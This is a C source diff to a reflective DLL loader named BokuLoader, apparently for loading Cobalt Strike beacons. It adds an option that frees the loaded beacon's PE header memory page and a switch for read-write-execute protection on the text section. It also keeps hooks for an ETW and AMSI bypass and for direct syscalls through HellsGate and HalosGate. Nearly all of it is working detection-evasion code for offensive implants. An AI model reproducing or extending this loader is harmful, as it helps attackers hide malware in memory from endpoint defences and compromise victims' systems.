@@ -1,8 +1,10 @@
 #define WIN32_LEAN_AND_MEAN
+
 /* Uncomment to enable features */
-//#define NOHEADERCOPY // RDLL will not copy headers over to the loaded beacon
 //#define BYPASS       // ETW & AMSI bypass switch. Comment out this line to disable
 //#define SYSCALLS     // Use direct syscalls with HellGate & HalosGate instead of WINAPIs
+/********************************/
+
 #include <windows.h>
 
 typedef struct Export {
@@ -79,6 +81,9 @@ typedef PVOID  (WINAPI * tGetProcAddress)(PVOID, LPCSTR);
 typedef LONG32 (NTAPI  * tNtProt)        (HANDLE, PVOID, PVOID, ULONG32, PVOID);
 typedef LONG32 (NTAPI  * tNtAlloc)       (HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 typedef LONG32 (NTAPI  * tNtFlush)       (HANDLE, PVOID, ULONG32);
+#ifdef FREE_HEADERS
+typedef LONG32 (NTAPI  * tNtFree)        (HANDLE, PVOID, PSIZE_T, ULONG);
+#endif
 
 typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, ULONG32, PVOID);
 
@@ -151,6 +156,11 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     char ntstr3[] = {'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
     tNtProt pNtProtectVirtualMemory = xGetProcAddress(ntstr3, &ntdll);
 
+    #ifdef FREE_HEADERS
+    char ntstr4[] = {'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
+    tNtFree pNtFreeVirtualMemory = xGetProcAddress(ntstr4, &ntdll);
+    #endif
+
     // AMSI & ETW Optional Bypass
     #ifdef BYPASS
     bypass(&ntdll, &k32, pLoadLibraryA, pNtProtectVirtualMemory);
@@ -172,8 +182,18 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 
     rdll_dst.dllBase = base;
 
-    // Optionally write Headers from initial source RDLL to loading beacon destination memory
-    #ifndef NOHEADERCOPY
+    #ifdef FREE_HEADERS
+    // Deallocate the first memory page (4096/0x1000 bytes)
+    base = rdll_dst.dllBase;
+    size = 4096;
+    //size = rdll_src.SizeOfHeaders;
+    #ifdef SYSCALLS
+    HellsGate(getSyscallNumber(pNtFreeVirtualMemory));
+    status = ((tNtFree)HellDescent)(NtCurrentProcess(), &base, &size, MEM_RELEASE);
+    #else
+    status = pNtFreeVirtualMemory(NtCurrentProcess(), &base, &size, MEM_RELEASE);
+    #endif
+    #elif !defined(STOMP_HEADERS)
     Memcpy(rdll_dst.dllBase, rdll_src.dllBase, rdll_src.SizeOfHeaders);
     #endif
 
@@ -453,9 +473,14 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     ULONG32 oldprotect = 0;
     base = rdll_dst.TextSection;
     size = rdll_dst.TextSectionSize;
+    #ifdef USE_RWX
+    ULONG32 newprotect = PAGE_EXECUTE_READWRITE;
+    #else
+    ULONG32 newprotect = PAGE_EXECUTE_READ;
+    #endif
     #ifdef SYSCALLS
     HellsGate(getSyscallNumber(pNtProtectVirtualMemory));
-    status = ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, &oldprotect);
+    status = ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
     if (!NT_SUCCESS(status))
         return NULL;
 
@@ -464,7 +489,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     if (!NT_SUCCESS(status))
         return NULL;
     #else
-    status = pNtProtectVirtualMemory(NtCurrentProcess(), &base, &size, PAGE_EXECUTE_READ, &oldprotect);
+    status = pNtProtectVirtualMemory(NtCurrentProcess(), &base, &size, newprotect, &oldprotect);
     if (!NT_SUCCESS(status))
         return NULL;
 
